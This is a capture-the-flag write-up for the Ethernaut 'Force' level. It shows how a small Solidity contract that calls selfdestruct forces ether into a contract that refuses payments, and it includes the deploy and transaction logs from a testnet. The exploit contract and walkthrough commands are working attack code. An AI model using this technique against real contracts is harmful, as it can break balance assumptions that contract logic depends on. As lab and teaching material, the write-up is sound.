# 07 - Force

## Challenge

Some contracts will simply not take your money ¯\\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

Things that might help:

- Fallback methods
- Sometimes the best way to attack a contract is with another contract.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

## Summary

The contract `Force` is a simple contract that does not accept any ether. The goal is to make the balance of the contract greater than zero. At first this seems impossible because we cannot call `send` or `transfer` on the contract. However, we can use a contract to call `selfdestruct` on itself and send the balance to `Force`.

[`selfdestruct`](https://solidity-by-example.org/hacks/self-destruct/):
- Contracts can be deleted from the blockchain by calling `selfdestruct`.
- `selfdestruct` sends all remaining Ether stored in the contract to a designated address.

This allows us to create a contract that will send its balance to `Force` when it is selfdestructed.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0x4E3Ac6C6Bd8a612407B862Ae356df8356fe984Ea'
```

We first deploy a contract that has 2 methods, `deposit()` which can deposit balance, and `hack(address)` which destructs the contract and sends the balance to `address`.

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    uint public balance = 0;

    function deposit() external payable {
        balance += msg.value;
    }

    function hack(address payable _to) external payable {
        selfdestruct(_to);
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['ForceHack']

>>> contract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> contract.deploy()
2023-06-07 20:40:22.246 | DEBUG    | cheb3.contract:deploy:92 - Deploying contract ...
2023-06-07 20:40:34.201 | INFO     | cheb3.contract:deploy:97 - The contract is deployed at 0x58b1Ceb2728Fe3F2fE673b8e23b1fC641bc145A2
```

Next, we can first call `deposit` and then `hack`:

```py
>>> contract.functions.balance().call()
0
>>> contract.functions.deposit().send_transaction(value=100, gas_limit=1000000)
2023-06-07 20:43:56.826 | INFO     | cheb3.contract:send_transaction:230 - (0x58b1Ceb2728Fe3F2fE673b8e23b1fC641bc145A2).deposit transaction hash: 0xccef39b829986ef685e32b7e5fec08954da3322bc4bd220c2e901350965e7b3f
AttributeDict({'blockHash': HexBytes('0xa93a29aac6ad80f51729c040f56a91fb840ff2aa7b8c44eb7f0a1d42acd58291'), 'blockNumber': 9141736, 'contractAddress': None, 'cumulativeGasUsed': 6940184, 'effectiveGasPrice': 69, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 43520, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x58b1Ceb2728Fe3F2fE673b8e23b1fC641bc145A2', 'transactionHash': HexBytes('0xccef39b829986ef685e32b7e5fec08954da3322bc4bd220c2e901350965e7b3f'), 'transactionIndex': 44, 'type': 0})
>>> contract.functions.balance().call()
100
>>> contract.functions.hack(contract_addr).send_transaction(gas_limit=1000000)
2023-06-07 20:45:10.199 | INFO     | cheb3.contract:send_transaction:230 - (0x58b1Ceb2728Fe3F2fE673b8e23b1fC641bc145A2).hack transaction hash: 0xdb7638e542f6ab5eb78ad49f6f6f9515dca009f486ed31e9a8f1d22b1f2cfde8
AttributeDict({'blockHash': HexBytes('0x5afe6676450c1cdf7427d98ca46759b30ee64bc25d84bd4d8145c7d0822eab79'), 'blockNumber': 9141741, 'contractAddress': None, 'cumulativeGasUsed': 14379718, 'effectiveGasPrice': 67, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 29439, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x58b1Ceb2728Fe3F2fE673b8e23b1fC641bc145A2', 'transactionHash': HexBytes('0xdb7638e542f6ab5eb78ad49f6f6f9515dca009f486ed31e9a8f1d22b1f2cfde8'), 'transactionIndex': 81, 'type': 0})
```

Now if we try to call `contract.functions.balance().call()` again, it will throw exception because contract was already destructed. 

From Chrome Devtool, `await getBalance(contract.address)` shows non-zero as expected since our contract was selfdestructed and the balance was sent to `Force` contract.

Finally, submit the instance to pass the level.

## Afterword

In solidity, for a contract to be able to receive ether, the fallback function must be marked `payable`.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant `address(this).balance == 0` for any contract logic.